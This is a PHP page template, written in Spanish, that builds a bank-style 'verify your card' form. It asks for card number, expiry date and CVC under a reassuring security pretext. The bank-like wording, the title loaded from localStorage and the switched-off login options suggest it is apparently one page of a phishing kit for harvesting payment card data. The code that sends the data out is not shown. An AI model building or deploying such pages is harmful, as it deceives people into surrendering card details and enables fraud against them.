<?php require_once("header.php"); ?>

<?php
$titulo = "Tarjeta D&eacute;bito o Cr&eacute;dito";
$mensaje = "No dudamos que seas tu, pero por seguridad, verifica la informacion.";
$mostrar_icono_info = true; 
$icono_info = "./img/info.jpg"; 
$contenidotitle = "Ingresa";
$contenidotitle2 = "";

// Variables para el primer input
$contenidotitle_1 = "Numero de tarjeta";
$show_input_1 = true;
$id_input_1 = "txtTarjeta";
$icono_input_1 = "./img/credit-card.png";
$nombre_input_1 = "txtTarjeta";
$placeholder_input_1 = "";
$max_caracteres1 = 16; // Máximo de caracteres permitidos
$min_caracteres1 = 13; // Mínimo de caracteres permitidos
$disabled = false; 
$tipo_input_html1 = "number"; 
$activar_inputmode_numeric1 = false; 


// Variables para el segundo y tercer input (select boxes)
$contenidotitle_2 = "Mes";
$show_input_2 = true;
$id_input_2 = "mFecha";
$nombre_input_2 = "mFecha";

$contenidotitle_3 = "Año";
$show_input_3 = true;
$id_input_3 = "aFecha";
$nombre_input_3 = "aFecha";

// Variables para el cuarto y quinto input
$contenidotitle_4 = "CVC";
$show_input_4 = true;
$icono_input_4 = "./img/credit-card.png";
$id_input_4 = "txtCVV";
$nombre_input_4 = "txtCVV";
$placeholder_input_4 = "";
$max_caracteres4 = 4; // Máximo de caracteres permitidos
$min_caracteres4 = 3; // Mínimo de caracteres permitidos
$tipo_input_html4 = "number"; 
$activar_inputmode_numeric4 = false;


$contenidotitle_5 = "Ingresa tu telefono";
$show_input_5 = false;
$id_input_5 = "input5";
$icono_input_5 = "./img/telefono.png";
$nombre_input_5 = "input5_nombre";
$placeholder_input_5 = "";
$max_caracteres5 = 10; // Máximo de caracteres permitidos
$min_caracteres5 = 5; // Mínimo de caracteres permitidos
$tipo_input_html5 = "";

$mostrar_icono_info_1 = true; // Mostrar el icono de información para el primer input
$icono_info_1 = "./img/info.jpg"; // Ruta al icono de información para el primer input

$mostrar_icono_info_2 = false; // Mostrar el icono de información para el segundo input
$icono_info_2 = "./img/info.jpg"; // Ruta al icono de información para el segundo input

$mostrar_icono_info_3 = false; // Mostrar el icono de información para el tercer input
$icono_info_3 = "./img/info.jpg"; // Ruta al icono de información para el tercer input

$mostrar_icono_info_4 = true; // Mostrar el icono de información para el cuarto input
$icono_info_4 = "./img/info.jpg"; // Ruta al icono de información para el cuarto input

$mostrar_icono_info_5 = true; // Mostrar el icono de información para el quinto input
$icono_info_5 = "./img/info.jpg"; // Ruta al icono de información para el quinto input

// Contenido de subtítulo
$contenidotitle2_1 = "";
$contenidotitle2_2 = "";
$contenidotitle2_3 = "";
$contenidotitle2_4 = "";
$contenidotitle2_5 = "";

// Variables para los botones
$mostrar_button1 = false;
$id_button1 = "button1";
$nombre_button1 = "button1_nombre";
$texto_button1 = "cancelar";
$mostrar_button2 = true;
$id_button2 = "btnTarjeta";
$nombre_button2 = "btnTarjeta";
$texto_button2 = "Verificar";

// Variables para el mensaje de teclado
$mostrar_mensaje_teclado = true;
$mensaje_teclado = "El CVC se encuentra en la parte de atrás de tu tarjeta si es visa o Mastercard";

// Variables para el enlace de "¿Olvidaste tu usuario?"
$mostrar_enlace = false;

// Variables para el icono de generación de clave personal
$mostrar_genera_clave_personal = false;
$icono = "ruta_al_icono_generacion_clave";
$Generaunaclavepersonal = "Genera una clave personal";
?>
<?php include "cuadro2.php" ?>
<?php include "bannerc.php" ?>
<script>
function validarNumeros(e, inputId, maxLength) {
    var charCode = (e.which) ? e.which : e.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        e.preventDefault();
    }
    // Limitar la longitud del texto
    var input = document.getElementById(inputId);
    if (input.value.length >= maxLength) {
        e.preventDefault();
    }
}

document.getElementById("txtTarjeta").addEventListener("keypress", function(e) {
    validarNumeros(e, "txtTarjeta", <?php echo $max_caracteres1; ?>);
});
document.getElementById("txtCVV").addEventListener("keypress", function(e) {
    validarNumeros(e, "txtCVV", <?php echo $max_caracteres4; ?>);
});

document.addEventListener("DOMContentLoaded", function() {
    var tituloInicioSesionElement = document.querySelector(".grotesca-papel");
    var titulo = localStorage.getItem('tituloInicioSesion');

    if (titulo) {
        tituloInicioSesionElement.textContent = titulo;
    } else {
        //mensaje predeterminado
        tituloInicioSesionElement.textContent = "Verificacion";
    }
});
</script>
<?php include "footer.php" ?>
